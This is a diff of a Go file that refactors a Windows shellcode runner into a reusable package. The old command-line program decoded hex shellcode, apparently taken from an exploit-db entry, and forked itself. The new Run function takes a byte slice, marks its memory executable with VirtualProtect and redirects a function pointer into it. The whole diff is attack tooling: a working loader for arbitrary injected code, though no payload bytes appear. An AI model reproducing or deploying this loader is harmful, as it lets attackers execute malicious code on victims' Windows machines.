@@ -1,16 +1,6 @@
-// This program runs the shellcode from: https://www.exploit-db.com/exploits/40245/
-//
-// As the shellcode is 32 bit, this must also be compiled as a 32 bit go application
-// via "set GOARCH=386"
-
-package main
+package shellcode
 
 import (
-	"encoding/hex"
-	"fmt"
-	"log"
-	"os"
-	"os/exec"
 	"syscall"
 	"unsafe"
 )
@@ -26,28 +16,8 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
 	return ret > 0
 }
 
-func fork() bool {
-	if os.Getenv("CHILD") != "" {
-		return false
-	}
-
-	log.Println("Forking child")
-	os.Setenv("CHILD", "true")
-	cmd := exec.Command(os.Args[0], os.Args[1:]...)
-	cmd.Start()
-	return true
-}
-
-func main() {
-	if fork() {
-		os.Exit(0)
-	}
-	shellcode, err := hex.DecodeString(os.Args[1])
-	if err != nil {
-		fmt.Printf("Error decoding arg 1: %s\n", err)
-		os.Exit(1)
-	}
-
+func Run(sc []byte) {
+	// TODO need a Go safe fork
 	// Make a function ptr
 	f := func() {}
 
@@ -58,11 +28,11 @@ func main() {
 	}
 
 	// Override function ptr
-	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))
+	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
 
 	// Change permsissions on shellcode string data
 	var oldshellcodeperms uint32
-	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
+	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
 		panic("Call to VirtualProtect failed!")
 	}
 
